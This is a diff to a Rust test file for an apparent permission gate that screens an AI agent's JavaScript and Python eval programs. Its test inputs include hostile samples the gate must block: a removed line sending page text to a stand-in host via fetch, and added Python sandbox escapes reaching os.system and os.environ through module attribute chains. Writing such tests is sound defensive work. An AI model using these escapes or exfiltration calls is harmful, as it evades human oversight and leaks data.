@@ -1,8 +1,7 @@
 #![cfg(unix)]
 
-//! Oh My Pi `eval` programs that only compute in memory or drive a local
-//! browser page are read by content; anything that reaches further keeps its
-//! review.
+//! Oh My Pi `eval` programs that only compute in memory are read by content;
+//! anything that reaches further keeps its review.
 
 use crate::git_helper_fixture::evaluate_pre_tool_envelope_with_context;
 use crate::pretool_git_session_ops::{default_controls, session, Session};
@@ -49,23 +48,24 @@ fn pure_python_is_allowed_and_reaching_python_is_reviewed() {
 }
 
 #[test]
-fn local_browser_driving_is_allowed_and_outside_pages_are_reviewed() {
+fn browser_driving_and_module_attribute_chains_are_reviewed() {
     let s = session("omp-eval-browser");
     let cwd = s.org.to_str().unwrap();
-    let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
-    let open = format!(
-        "const tab = await browser.open({{name:'t', url:'file://{cwd}/index.html', app:{{path:'{chrome}', args:['--allow-file-access-from-files']}}, headed:false}}); await tab.fill('#new-task','x'); await tab.click('button[type=submit]'); display({{text: await tab.text('#tasks'), n: await tab.count('li'), s: await tab.evaluate(\"localStorage.getItem('k')\")}}); await tab.close();"
-    );
-    assert!(allowed(&s, "js", &open));
     for code in [
+        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/index.html'}}); await tab.close();"),
         String::from("const tab = await browser.open({name:'t', url:'https://example.com/'});"),
-        String::from("const tab = await browser.open({name:'t', url:'file:///etc/hosts'});"),
-        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/../x.html'}});"),
-        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/a.html', app:{{path:'/bin/sh'}}}});"),
-        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/a.html', app:{{path:'{chrome}', args:['--disable-web-security']}}}});"),
-        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/a.html'}}); await tab.evaluate(\"fetch('//evil.test/'+document.body.innerText)\");"),
-        format!("const tab = await browser.open({{name:'t', url:'file://{cwd}/a.html'}}); await tab.screenshot({{path:'/tmp/x.png'}});"),
+        String::from("const tab = browser.tab('t'); await tab.click('a');"),
     ] {
         assert!(!allowed(&s, "js", &code), "{code}");
+    }
+    for code in [
+        "import shlex\nshlex.os.system('id')",
+        "import typing\ntyping.sys.modules['os'].system('id')",
+        "import collections\ncollections._sys.exit(0)",
+        "import dataclasses\ndataclasses.sys.modules['os'].system('id')",
+        "import shlex\nprint('{0.os.environ}'.format(shlex))",
+        "import operator, shlex\nprint(operator.attrgetter('os')(shlex))",
+    ] {
+        assert!(!allowed(&s, "py", code), "{code}");
     }
 }
